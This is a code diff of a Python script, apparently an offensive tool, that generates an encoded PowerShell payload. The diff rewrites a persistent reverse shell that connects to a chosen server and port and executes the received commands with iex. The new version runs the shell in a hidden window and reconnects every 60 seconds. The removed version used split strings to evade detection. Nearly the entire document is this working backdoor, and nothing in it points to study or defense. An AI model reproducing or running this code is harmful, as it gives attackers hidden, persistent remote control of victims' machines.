@@ -137,48 +137,71 @@ def main():
     port_number = args.port
     global pow
     ps_command = f'''
-function Start-PersistentCommand {{
-    param (
-        [string]$UniqueIdentifier,
-        [string]$ServerAddress,
-        [int]$PortNumber
-    )
-    while ($true) {{
-        $mutex = New-Object System.Threading.Mutex($false, $UniqueIdentifier)
-        if ($mutex.WaitOne(0, $false)) {{
-            try {{
-                $isRunning = Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object {{ $_.CommandLine -like "*$UniqueIdentifier*" }}
-                if (-not $isRunning) {{
-                    $client = New-Object Sys''tem.N''et.Soc''kets.Tc''pCl''ient($ServerAddress, $PortNumber)
+$uniqueIdentifier = "Keres"
+$maxProcesses = 1
+$spawnedProcesses = 0
+
+while ($true){{
+    $isRunning = Get-Process -Name powershell -ErrorAction SilentlyContinue | Where-Object {{ $_.CommandLine -like "*$uniqueIdentifier*" }}
+
+    if (-not $isRunning -and $spawnedProcesses -lt $maxProcesses) {{
+        $connectionTest = Test-Connection -ComputerName '{server_address}' -Count 1 -Quiet
+
+        if ($connectionTest) {{
+            Start-Process $PSHOME\powershell.exe -ArgumentList {{
+                $uniqueIdentifier
+                $client = New-Object System.Net.Sockets.TcpClient
+
+                try {{
+                    $client.Connect('{server_address}', {port_number})
                     $stream = $client.GetStream()
+
                     while ($true) {{
+                        if (-not $client.Connected) {{
+                            Write-Host "Connection lost. Reconnecting..."
+                            Start-Sleep -Seconds 60  # Wait for 60 seconds before attempting to reconnect
+                            break
+                        }}
+
                         $bytes = New-Object byte[] 65535
                         $i = $stream.Read($bytes, 0, $bytes.Length)
-                        if ($i -le 0) {{ break }}
+
+                        if ($i -le 0) {{
+                            Write-Host "Connection to server closed. Reconnecting..."
+                            Start-Sleep -Seconds 60  # Wait for 60 seconds before attempting to reconnect
+                            break
+                        }}
+
                         $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)
                         $sendback = (iex $data 2>&1 | Out-String)
-                        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
+                        $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
                         $sendbyte = [System.Text.Encoding]::ASCII.GetBytes($sendback2)
                         $stream.Write($sendbyte, 0, $sendbyte.Length)
                         $stream.Flush()
                     }}
-                    $client.Close()
+                }} catch {{
+                    Write-Host "Error: $_"
+                }} finally {{
+                    if ($stream) {{ $stream.Close() }}
+                    if ($client) {{ $client.Close() }}
                 }}
-                else {{
-                    Write-Host "Script is already running."
-                }}
-            }}
-            finally {{
-                $mutex.ReleaseMutex()
-            }}
+            }} -WindowStyle Hidden
+
+            $spawnedProcesses++
+        }} else {{
+            Write-Host "No connection to the server. Skipping process spawn."
         }}
-        else {{
-            Write-Host "Another instance is already running."
-        }}
-        Start-Sleep -Seconds 10
+    }} elseif ($spawnedProcesses -ge $maxProcesses) {{
+        Write-Host "Maximum number of processes reached. Skipping process spawn."
+    }} else {{
+        Write-Host "Script is already running."
     }}
+
+    # Count processes after a 60-second wait
+    Start-Sleep -Seconds 60
+    $spawnedProcesses = (Get-Process -Name powershell -ErrorAction SilentlyContinue | Where-Object {{ $_.CommandLine -like "*$uniqueIdentifier*" }}).Count
 }}
-Start-PersistentCommand -UniqueIdentifier "Keres" -ServerAddress "{server_address}" -PortNumber {port_number}
+
 '''
     encoded_ps_command = encode_powershell_command(ps_command)
     
